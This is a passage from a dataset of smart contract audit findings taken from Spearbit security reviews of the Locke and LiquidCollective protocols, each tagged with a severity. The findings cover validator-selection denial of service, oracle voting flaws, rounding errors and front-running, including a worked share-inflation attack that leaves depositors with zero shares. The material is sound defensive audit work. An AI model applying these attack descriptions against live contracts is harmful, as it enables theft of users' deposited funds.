"html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Since block.timestamp >= endStream in the abovementioned cases the lastApplicableTime function will always return endStream.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Simplifying code logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } 17 function currDepositTokensNotYetStreamed(IStream stream, address who) external view returns (uint256) { unchecked { uint32 timestamp = uint32(block.timestamp); (uint32 startTime, uint32 endStream, ,) = stream.streamParams(); if (block.timestamp >= endStream) return 0; ( uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lastUpdate, bool merkleAccess ) = stream.tokenStreamForAccount(address(who)); if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } } }", "labels": ["Spearbit", "Locke", "Severity: Informational"]}, {"title": "Operators._hasFundableKeys returns true for operators that do not have fundable keys", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Because _hasFundableKeys uses operator.stopped in the check, an operator without fundable keys be validated and return true. Scenario: Op1 has  keys = 10  limit = 10  funded = 10  stopped = 10 This means that all the keys got funded, but also \"exited\". Because of how _hasFundableKeys is made, when you call _hasFundableKeys(op1) it will return true even if the operator does not have keys available to be funded. By returning true, the operator gets wrongly included in getAllFundable returned array. That function is critical because it is the one used by pickNextValidators that picks the next validator to be selected and stake delegate user ETH. Because of this issue in _hasFundableKeys also the issue OperatorsRegistry._getNextValidatorsFromActive- Operators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys) can happen DOSing the contract that will always make pickNextValidators return empty. Check Appendix for a test case to reproduce this issue.", "labels": ["Spearbit", "LiquidCollective", "Severity: Critical Risk"]}, {"title": "OperatorsRegistry._getNextValidatorsFromActiveOperators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "This issue is also related to OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator . Consider a scenario where we have Op at index 0 name op1 active true limit 10 funded 10 stopped 10 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 In this case,  Op1 got all 10 keys funded and exited. Because it has keys=10 and limit=10 it means that it has no more keys to get funded again.  Op2 instead has still 10 approved keys to be funded. Because of how the selection of the picked validator works uint256 selectedOperatorIndex = 0; for (uint256 idx = 1; idx < operators.length;) { if ( operators[idx].funded - operators[idx].stopped < operators[selectedOperatorIndex].funded - operators[selectedOperatorIndex].stopped ) { selectedOperatorIndex = idx; } unchecked { ++idx; } } When the function finds an operator with funded == stopped it will pick that operator because 0 < operators[selectedOperatorIndex].funded - operators[selectedOperatorIndex].stopped. After the loop ends, selectedOperatorIndex will be the index of an operator that has no more validators to be funded (for this scenario). Because of this, the following code uint256 selectedOperatorAvailableKeys = Uint256Lib.min( operators[selectedOperatorIndex].keys, operators[selectedOperatorIndex].limit ) - operators[selectedOperatorIndex].funded; when executed on Op1 it will set selectedOperatorAvailableKeys = 0 and as a result, the function will return return (new bytes[](0), new bytes[](0));. 13 In this scenario when stopped==funded and there are no keys available to be funded (funded == min(limit, keys)) the function will always return an empty result, breaking the pickNextValidators mechanism that won't be able to stake user's deposited ETH anymore even if there are operators with fundable validators. Check the Appendix for a test case to reproduce this issue.", "labels": ["Spearbit", "LiquidCollective", "Severity: Critical Risk"]}, {"title": "Oracle.removeMember could, in the same epoch, allow members to vote multiple times and other members to not vote at all", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of removeMember is introducing an exploit that allows an oracle member to vote again and again (in the same epoch) and an oracle that has never voted is prevented from voting (in the same epoch). Because of how OracleMembers.deleteItem is implemented, it will swap the last item of the array with the one that will be deleted and pop the last element. Let's make an example: 1) At T0 m0 to the list of members  members[0] = m0. 2) At T1 m1 to the list of members  members[1] = m1. 3) At T3 m0 call reportBeacon(...). By doing that, ReportsPositions.register(uint256(0)); will be called, registering that the member at index 0 has registered the vote. 4) At T4, the oracle admin call removeMember(m0). This operation, as we said, will swap the member's address from the last position of the array of members with the position of the member that will be deleted. After doing that will pop the last position of the array. The state changes from members[0] = m0; members[1] = m1 to members[0] = m1;. At this point, the oracle member m1 will not be able to vote during this epoch because when he/she will call reportBeacon(...) the function will enter inside the check. if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(_epochId, msg.sender); } This is because int256 memberIndex = OracleMembers.indexOf(msg.sender); will return 0 (the position of the m0 member that have already voted) and ReportsPositions.get(uint256(0)) will return true. At this point, if for whatever reason an admin of the contract add again the deleted oracle, it would be added to the position 1 of the array of the members, allowing the same member that have already voted, to vote again. Note: while the scenario where a removed member can vote multiple time would involve a corrupted admin (that would re-add the same member) the second scenario that prevent a user to vote would be more common. Check the Appendix for a test case to reproduce this issue. 14", "labels": ["Spearbit", "LiquidCollective", "Severity: High Risk"]}, {"title": "Order of calls to removeValidators can affect the resulting validator keys set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "If two entities A and B (which can be either the admin or the operator O with the index I) send a call to removeValidators with 2 different set of parameters:  T1 : (I, R1)  T2 : (I, R2) Then depending on the order of transactions, the resulting set of validators for this operator might be different. And since either party might not know a priori if any other transaction is going to be included on the blockchain after they submit their transaction, they don't have a 100 percent guarantee that their intended set of validator keys are going to be removed. This also opens an opportunity for either party to DoS the other party's transaction by frontrunning it with a call to remove enough validator keys to trigger the InvalidIndexOutOfBounds error: OperatorsRegistry.1.sol#L324-L326: if (keyIndex >= operator.keys) { revert InvalidIndexOutOfBounds(); } to removeValidators and compare it", "labels": ["Spearbit", "LiquidCollective", "Severity: High Risk"]}, {"title": "Non-zero operator.limit should always be greater than or equal to operator.funded", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "For the subtraction operation in OperatorsRegistry.1.sol#L428-L430 to not underflow and revert, there should be an assumption that operators[selectedOperatorIndex].limit >= operators[selectedOperatorIndex].funded Perhaps this is a general assumption, but it is not enforced when setOperatorLimits is called with a new set of limits.", "labels": ["Spearbit", "LiquidCollective", "Severity: High Risk"]}, {"title": "Decrementing the quorum in Oracle in some scenarios can open up a frontrunning/backrunning opportunity for some oracle members", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Assume there are 2 groups of oracle members A, B where they have voted for report variants Va and Vb respectively. Let's also assume the count for these variants Ca and Cb are equal and are the highest variant vote counts among all possible variants. If the Oracle admin changes the quorum to a number less than or equal to Ca + 1 = Cb + 1, any oracle member can backrun this transaction by the admin to decide which report variant Va or Vb gets pushed to the River. This is because when a lower quorum is submitted by the admin and there exist two variants that have the highest number of votes, in the _getQuorumReport function the returned isQuorum parameter would be false since repeat == 0 is false: Oracle.1.sol#L369: return (maxval >= _quorum && repeat == 0, variants[maxind]); Note that this issue also exists in the commit hash 030b52feb5af2dd2ad23da0d512c5b0e55eb8259 and can be triggered by the admin either by calling setQuorum or addMember when the abovementioned conditions are met. Also, note that the free oracle member agent can frontrun the admin transaction to decide the quorum earlier in the scenario above. Thus this way _getQuorumReport would actually return that it is a quorum.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "_getNextValidatorsFromActiveOperators can be tweaked to find an operator with a better validator pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Assume for an operator: (A, B) = (funded - stopped, limit - funded) The current algorithm finds the first index in the cached operators array with the minimum value for A and tries to gather as many publicKeys and signatures from this operator's validators up to a max of _requestedAmount. But there is also the B cap for this amount. And if B is zero, the function returns early with empty arrays. Even though there could be other approved and non-funded validators from other operators. Related: OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator , OperatorsRegistry._getNextValidatorsFromActiveOperators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys) , _hasFundableKeys marks operators that have no more fundable validators as fundable.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "Dust might be trapped in WlsETH when burning one's balance.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "It is not possible to burn the exact amount of minted/deposited lsETH back because of the _value provided to burn is in ETH. Assume we've called mint(r,v) with our address r, then to get the v lsETH back to our address, we need to find an x where v = bx S B c and call burn(r, x) (Here S represents the total share of lsETH and B the total underlying value.). It's not always possible to find the exact x. So there will always be an amount locked in this contract ( v (cid:0) bx S B c ). These dust amounts can accumulate from different users and turn into a big number. To get the full amount back, the user needs to mint more wlsETH tokens so that we can find an exact solution to v = bx S B c. The extra amount to get the locked-up fees back can be engineered. The same problem exists for transfer and transferFrom. Also note, if you have minted x amount of shares, the balanceOf would tell you that you own b = b xB S c wlsETH. Internally wlsETH keeps track of the shares x. So users think they can only burn b amount, plug that in for the _value and in this case, the number of shares burnt would be b xB S cS B % $ which has even more rounding errors. wlsETH could internally track the underlying but that would not appropriate value like lsETH, which would basically be kind of wETH. We think the issue of not being able to transfer your full amount of shares is not as serious as not being able to burn back your shares into lsETH. On the same note, we think it would be beneficial to expose the wlsETH share amount to the end user: function sharesBalanceOf(address _owner) external view returns (uint256 shares) { return BalanceOf.get(_owner); }", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "BytesLib.concat can potentailly return results with dirty byte paddings.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "concat does not clean the potential dirty bytes that might have been copied from _postBytes (nor does it clean the padding). The dirty bytes from _postBytes are carried over to the padding for tempBytes.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "The reportBeacon is prone to front-running attacks by oracle members", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "There could be a situation where the oracle members are segmented into 2 groups A and B , and members of the group A have voted for the report variant Va and the group B for Vb . Also, let's assume these two variants are 1 vote short of quorum. Then either group can try to front-run the other to push their submitted variant to river.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "Shares distributed to operators suffer from rounding error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "_rewardOperators distribute a portion of the overall shares distributed to operators based on the number of active and funded validators that each operator has. The current number of shares distributed to a validator is calculated by the following code _mintRawShares(operators[idx].feeRecipient, validatorCounts[idx] * rewardsPerActiveValidator); where rewardsPerActiveValidator is calculated as uint256 rewardsPerActiveValidator = _reward / totalActiveValidators; This means that in reality each operator receives validatorCounts[idx] * (_reward / totalActiveValida- tors) shares. Such share calculation suffers from a rounding error caused by division before multiplication.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Note that  limited  number of validators (already pushed by op) that have been approved by Alluvial and can be selected to be funded.  funded  number of validators funded.  stopped  number of validators exited (so that were funded at some point but for any reason they have exited the staking). The implementation of the function should favor operators that have the highest number of available validators to be funded. Nevertheless functions favor validators that have stopped value near the funded value. Consider the following example: Op at index 0 name op1 active true limit 10 funded 5 stopped 5 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 1) op1 and op2 have 10 validators whitelisted. 2) op1 at time1 get 5 validators funded. 3) op1 at time2 get those 5 validators exited, this mean that op.stopped == 5. In this scenario, those 5 validators would not be used because they are \"blacklisted\". At this point  op1 have 5 validators that can be funded. 24  op2 have 10 validators that can be funded. pickNextValidators logic should favor operators that have the higher number of available keys (not funded but approved) to be funded. If we run operatorsRegistry.pickNextValidators(5); the result is this Op at index 0 name op1 active true limit 10 funded 10 stopped 5 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 Op1 gets all the remaining 5 validators funded, the function (from the specification of the logic) should instead have picked Op2. Check the Appendix for a test case to reproduce this issue.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "approve() function can be front-ran resulting in token theft", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The approve() function has a known race condition that can lead to token theft. If a user calls the approve function a second time on a spender that was already allowed, the spender can front-run the transaction and call transferFrom() to transfer the previous value and still receive the authorization to transfer the new value.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "Add missing input validation on constructor/initializer/setters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Allowlist.1.sol  initAllowlistV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level.  allow should check _accounts[i] to be not equal to address(0). Firewall.sol  constructor should check that: governor_ != address(0). executor_ != address(0). destination_ != address(0).  setGovernor should check that newGovernor != address(0).  setExecutor should check that newExecutor != address(0). OperatorsRegistry.1.sol  initOperatorsRegistryV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level.  addOperator should check: _name to not be an empty string. _operator to not be address(0). _feeRecipi- ent to not be address(0).  setOperatorAddress should check that _newOperatorAddress is not address(0).  setOperatorFeeRecipientAddress should check that _newOperatorFeeRecipientAddress is not address(0).  setOperatorName should check that _newName is not an empty string. Oracle.1.sol  initOracleV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level. Consider also adding some min and max limit to the values of _annualAprUpperBound and _relativeLowerBound and be sure that _epochsPerFrame, _slotsPerEpoch, _secondsPerSlot and _genesisTime matches the values expected.  addMember should check that _newOracleMember is not address(0).  setBeaconBounds: Consider adding min/max value that _annualAprUpperBound and _relativeLowerBound should respect. River.1.sol  initRiverV1: _globalFee should follow the same validation done in setGlobalFee. Note that client said that 0 is a valid _- globalFee value \"The revenue redistributuon would be computed off-chain and paid by the treasury in that case. It's still an on-going discussion they're having at Alluvial.\" _operatorRewardsShare should follow the same validation done in setOperatorRewardsShare. Note that client said that 0 is a valid _operatorRewardsShare value \"The revenue redistributuon would be computed off-chain and paid by the treasury in that case. It's still an on-going discussion they're having at Alluvial.\" ConsensusLayerDepositManager.1.sol  initConsensusLayerDepositManagerV1: _withdrawalCredentials should not be empty and follow the re- quirements expressed in the following official Consensus Specs document. 26", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "LibOwnable._setAdmin allows setting address(0) as the admin of the contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "While other contracts like RiverAddress (for example) do not allow address(0) to be used as set input parameter, there is no similar check inside LibOwnable._setAdmin. Because of this, contracts that call LibOwnable._setAdmin with address(0) will not revert and functions that should be callable by an admin cannot be called anymore. This is the list of contracts that import and use the LibOwnable library  AllowlistV1  OperatorsRegistryV1  OracleV1  RiverV1", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "OracleV1.getMemberReportStatus returns true for non existing oracles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "memberIndex will be equal to -1 for non-existing oracles, which will cause the mask to be equal to 0, which will cause the function to return true for non-existing oracles.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "Operators might add the same validator more than once", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Operators can use OperatorsRegistryV1.addValidators to add the same validator more than once. Depositors' funds will be directed to these duplicated addresses, which in turn, will end up having more than 32 eth. This act will damage the capital efficiency of the entire deposit pool and thus will potentially impact the pool's APY.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "OracleManager.setBeaconData possible front running attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The system is designed in a way that depositors receive shares (lsETH) in return for their eth de- posit. A share represents a fraction of the total eth balance of the system in a given time. Investors can claim their staking profits by withdrawing once withdrawals are active in the system. Profits are being pulled from ELFeeRe- cipient to the River contract when the oracle is calling OracleManager.setBeaconData. setBeaconData updates BeaconValidatorBalanceSum which might be increased or decreased (as a result of slashing for instance). Investors have the ability to time their position in two main ways:  Investors might time their deposit just before profits are being distributed, thus harvesting profits made by others.  Investors might time their withdrawal / sell lsETH on secondary markets just before the loss is realized. By doing this, they will effectively avoid the loss, escaping the intended mechanism of socializing losses.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "SharesManager._mintShares - Depositors may receive zero shares due to front-running", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The number of shares minted to a depositor is determined by (_underlyingAssetValue * _total- Supply()) / oldTotalAssetBalance. Potential attackers can spot a call to UserDepositManagerV1._deposit and front-run it with a transaction that sends wei to the contract (by self-destructing another contract and sending the funds to it), causing the victim to receive fewer shares than what he expected. More specifically, In case old- TotalAssetBalance() is greater than _underlyingAssetValue * _totalSupply(), then the number of shares the depositor receives will be 0, although _underlyingAssetValue will be still pulled from the depositors balance. An attacker with access to enough liquidity and to the mem-pool data can spot a call to UserDepositManagerV1._- deposit and front-run it by sending at least totalSupplyBefore * (_underlyingAssetValue - 1) + 1 wei to the contract . This way, the victim will get 0 shares, but _underlyingAssetValue will still be pulled from its account balance. In this case, the attacker does not necessarily have to be a whitelisted user, and it is important to mention that the funds that were sent by him can not be directly claimed back, rather, they will increase the price of the share. The attack vector mentioned above is the general front runner case, the most profitable attack vector will be the case where the attacker is able to determine the share price (for instance if the attacker mints the first share). In this scenario, the attacker will need to send at least attackerShares * (_underlyingAssetValue - 1) + 1 to the contract, (attackerShares is completely controlled by the attacker, and thus can be 1). In our case, depositors are whitelisted, which makes this attack harder for a foreign attacker.", "labels": ["Spearbit", "LiquidCollective", "Severity: Medium Risk"]}, {"title": "Orphaned (index, values) in SlotOperator storage slots in operatorsRegistry", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "If !opExists corresponds to an operator which has OperatorResolution.active set to false, the line below can leave some orphaned (index, values) in SlotOperator storage slots: _setOperatorIndex(name, newValue.active, r.value.length - 1);", "labels": ["Spearbit", "LiquidCollective", "Severity: Low Risk"]}, {"title": "OperatorsRegistry.setOperatorName Possible front running attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "1. setOperatorName reverts for an already used name, which means that a call to setOperatorName might be front-ran using the same name. The front-runner can launch the same attack again and again thus causing a DoS for the original caller. 2. setOperatorName can be called either by an operator (to edit his own name) or by the admin. setOpera- torName will revert for an already used _newName. setOperatorName caller might be front-ran by the identical transaction transmitted by someone else, which will lead to failure for his transaction, where in practice this failure is a \"false failure\" since the desired change was already made.", "labels": ["Spearbit", "LiquidCollective", "Severity: Low"]}, {"title": "Prevent users from burning token via lsETH/wlsETH transfer or transferFrom functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of both lsETH (SharesManager component of River contract) and wlsETH allow the user to \"burn\" tokens, sending them directly to the address(0) via the transfer and transferFrom function. By doing that, it would bypass the logic of the existing burn functions present right now (or in the future when withdrawals will be enabled in River) in the protocol.", "labels": ["Spearbit", "LiquidCollective", "Severity: Low Risk"]}, {"title": "In addOperator when emitting an event use stack variables instead of reading from memory again", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In OperatorsRegistry's addOperator function when emitting the AddedOperator event we read from memory all the event parameters except operatorIndex. emit AddedOperator(operatorIndex, newOperator.name, newOperator.operator, newOperator.feeRecipient); We can avoid reading from memory to save gas.", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Rewrite pad64 so that it doesn't use BytesLib.concat and BytesLib.slice to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "We can avoid using the BytesLib.concat and BytesLib.slice and write pad64 mostly in assembly. Since the current implementation adds more memory expansion than needed (also not highly optimized).", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Cache r.value.length used in a loop condition to avoid reading from the storage multiple times.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In a loop like the one below, consider caching r.value.length value to avoid reading from storage on every round of the loop. for (uint256 idx = 0; idx < r.value.length;) {", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Rewrite the for loop in ValidatorKeys.sol::getKeys to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Rewrite the for loop in ValidatorKeys.sol::getKeys to save gas", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Operators.get in _getNextValidatorsFromActiveOperators can be replaced by Opera- tors.getByIndex to avoid extra operations/gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Operators.get in _getNextValidatorsFromActiveOperators performs multiple checks that have been done before when Operators.getAllFundable() was called. This includes finding the index, and checking if OperatorResolution.active is set. These are all not necessary.", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Avoid unnecessary equality checks with true in if statements", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Statements of the type if( condition == true) can be replaced with if(condition). The extra comparison with true is redundant.", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Rewrite OperatorRegistry.getOperatorDetails to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In getOperatorDetails the 1st line is: _index = Operators.indexOf(_name); Since we already have the _index from this line we can use that along with getByIndex to retrieve the _opera- torAddress. This would reduce the gas cost significantly, since Operators.get(_name) calls Operators._getOp- eratorIndex(name) to find the _index again. testExecutorCanSetOperatorLimit() (gas: -1086 (-0.001%)) testGovernorCanSetOperatorLimit() (gas: -1086 (-0.001%)) testUserDepositsForAnotherUser() (gas: -2172 (-0.001%)) testDeniedUser() (gas: -2172 (-0.001%)) testELFeeRecipientPullFunds() (gas: -2172 (-0.001%)) testUserDepositsUnconventionalDeposits() (gas: -2172 (-0.001%)) testUserDeposits() (gas: -2172 (-0.001%)) testNoELFeeRecipient() (gas: -2172 (-0.001%)) testUserDepositsTenPercentFee() (gas: -2172 (-0.001%)) testUserDepositsFullAllowance() (gas: -2172 (-0.001%)) testValidatorsPenaltiesEqualToExecLayerFees() (gas: -2172 (-0.001%)) testValidatorsPenalties() (gas: -2172 (-0.001%)) testUserDepositsOperatorWithStoppedValiadtors() (gas: -3258 (-0.002%)) testMakingFunctionGovernorOnly() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorLimit() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorStatus() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorStoppedValidatorCount() (gas: -1086 (-0.005%)) testExecutorCanSetOperatorStoppedValidatorCount() (gas: -1086 (-0.006%)) testGovernorCanSetOperatorStatus() (gas: -1086 (-0.006%)) testGovernorCanSetOperatorStoppedValidatorCount() (gas: -1086 (-0.006%)) testGovernorCanAddOperator() (gas: -1086 (-0.006%)) testExecutorCanSetOperatorStatus() (gas: -1086 (-0.006%)) Overall gas change: -36924 (-0.062%) Also note, when the operator is not OperatorResolution.active, _index becomes -1 in both cases. With the change suggested if _index is -1, uint256(_index) == type(uint256).max which would cause getByIndex to revert with OperatorNotFoundAtIndex(index). But with the current code, it will revert with an index out-of-bound type of error. _operatorAddress = Operators.getByIndex(uint256(_index)).operator;", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Rewrite/simplify OracleV1.isMember to save gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "OracleV1.isMember can be simplified to save gas.", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Cache beaconSpec.secondsPerSlot * beaconSpec.slotsPerEpoch multiplication in to save gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The calculation for _startTime and _endTime uses more multiplication than is necessary.", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "_rewardOperators could save gas by skipping operators with no active and funded validators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "_rewardOperators is the River function that distribute the earning rewards to each active operator based on the amount of active validators. The function iterate over the list of active operators returned by OperatorsRegistryV1.listActiveOperators calculating the total amount of active and funded validators (funded-stopped) and the number of active and funded validators (funded-stopped) for each operator. Because of current code, the final temporary array validatorCounts could have some item that contains 0 if the operator in the index position had no more active validators. This mean that: 1) gas has been wasted during the loop 2) gas will be wasted in the second loop, distributing 0 shares to an operator without active and funded valida- tors 3) _mintRawShares will be executed without minting any shares but emitting a Transfer event", "labels": ["Spearbit", "LiquidCollective", "Severity: Gas Optimization"]}, {"title": "Consider adding a strict check to prevent Oracle admin to add more than 256 members", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "At the time of writing this issue in the latest commit at 030b52feb5af2dd2ad23da0d512c5b0e55eb8259, in the natspec docs of OracleMembers there is a @dev comment that says @dev There can only be up to 256 oracle members. This is due to how report statuses are stored in Reports Positions If we look at ReportsPositions.sol the natspec docs explains that Each bit in the stored uint256 value tells if the member at a given index has reported But both Oracle.addMember and OracleMembers.push do not prevent the admin to add more than 256 items to the list of oracle members. If we look at the result of the test (located in Appendix), we can see that:  It's possible to add more than 256 oracle members.  The result of oracle.getMemberReportStatus(oracleMember257) return true even if the oracle member has not reported yet.  Because of that, oracle.reportConsensusLayerData (executed by oracleMember257) reverts correctly.  If we remove a member from the list (for example oracle member with index 1) the oracleMember257 it will be able to vote because will be swapped with the removed member and at oracle.getMemberReportStatus(oracleMember257) return false. this point 45", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "ApprovalsPerOwner.set does not check if owner or spender is address(0).", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "When ApprovalsPerOwner value is set for an owner and a spender, the addresses of the owner and the spender are not checked against address(0).", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Quorum could be higher than the number of oracles, DOSing the Oracle contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of Oracle.setQuorum only checks if the _newQuorum input parameter is not 0 or equal to the current quorum value. By setting a quorum higher than the number of oracle members, no quorum could be reached for the current or future slots.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "ConsensusLayerDepositManager.depositToConsensusLayer should be called only after a quorum has been reached to avoid rewarding validators that have not performed during the frame", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Alluvial is not tracking timestamps or additional information of some actions that happen on-chain like  when operator validator is funded on the beacon chain.  when an operator is added.  when validators are added or removed.  when a quorum is reached.  when rewards/penalties/slashes happen and which validator is involved.  and so on... 46 By not having these enriched informations it could happen that validators that have not contributed to a frame will still get rewards and this could be not fair to other validators that have contributed to the overall balance by working and bringing rewards. Let's make an example: we have 10 operators with 1k validators each at the start of a frame. At some point during the very end of the frame validato_10 get approved 9k validators and all of them get funded. Those validators only participated a small fraction in the production of the rewards. But because there's no way to track these timing and because oracles do not know anything about these (they just need to report the balance and the number of validators during the frame) they will report and arrive to a quorum of reportBeacon(correctEpoch, correctAmountOfBalance, 21_000) that will trigger the OracleManagerV1.setBeaconData. The contract check that 21_000 > DepositedValidatorCount.get() will pass and _onEarnings is called. Let's not consider the math involved in the process of calculating the number of shares to be distributed based on the staked balance delta, let's say that because of all the increase in capital Alluvial will call _rewardOperators(1_- 000_000); distributing 1_000_000 shares to operators based on the number of validators that produced that reward. Because as we said we do not know how much each validator has contributed, those shares will be 